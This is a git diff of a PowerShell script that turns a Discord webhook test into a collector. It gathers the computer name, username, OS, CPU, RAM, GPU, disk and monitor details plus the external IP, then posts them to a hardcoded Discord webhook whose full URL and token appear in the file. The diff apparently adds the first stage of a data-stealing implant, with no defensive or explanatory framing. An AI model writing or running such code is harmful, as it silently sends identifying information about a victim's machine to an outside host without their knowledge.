@@ -1,7 +1,41 @@
 $webhookUrl = "https://discord.com/api/webhooks/1297857112852140105/84TMuOVCJVaZ6ly3_hp7grnFGmEDkoXj1gvnuYrc3DIlEZ-gfu_aFIM_qiuY9HU6M7JG"
-$messageData = @{
-    content = "Test message from PowerShell"
+$externalIp = (Invoke-RestMethod -Uri "https://api.ipify.org?format=json").IP
+$gpuInfo = Get-WmiObject -Class Win32_VideoController | ForEach-Object {
+    "  - Name: $($_.Name), Adapter RAM (MB): $([math]::round($_.AdapterRAM / 1MB, 2)), Driver Version: $($_.DriverVersion)"
+} -join "`n"
+$hardDrives = Get-WmiObject -Class Win32_DiskDrive | ForEach-Object {
+    "  - Model: $($_.Model), Size (GB): $([math]::round($_.Size / 1GB, 2))"
+} -join "`n"
+$monitors = Get-WmiObject -Class Win32_DesktopMonitor | ForEach-Object {
+    "  - Name: $($_.Name), Resolution: $($_.ScreenWidth)x$($_.ScreenHeight)"
+} -join "`n"
+$deviceInfo = @{
+    ComputerName = $env:COMPUTERNAME
+    Username     = $env:USERNAME
+    OS           = (Get-WmiObject -Class Win32_OperatingSystem).Caption
+    CPU          = (Get-WmiObject -Class Win32_Processor).Name
+    RAM          = [math]::round((Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
+    IPAddress    = $externalIp
+    GPU          = $gpuInfo
+    HardDrives   = $hardDrives
+    Monitors     = $monitors
 }
-$jsonMessage = $messageData | ConvertTo-Json
+$deviceInfoFormatted = @"
+DEVICE INFO:
+Computer Name: $($deviceInfo.ComputerName)
+Username: $($deviceInfo.Username)
+OS: $($deviceInfo.OS)
+CPU: $($deviceInfo.CPU)
+RAM (GB): $($deviceInfo.RAM)
+External IP: $($deviceInfo.IPAddress)
+GPU:
+$($deviceInfo.GPU)
+Hard Drives:
+$($deviceInfo.HardDrives)
+Monitors:
+$($deviceInfo.Monitors)
+"@
+$deviceInfoMessage = @{ content = $deviceInfoFormatted }
+$jsonMessage = $deviceInfoMessage | ConvertTo-Json
 $response = Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonMessage -ContentType "application/json"
 $response
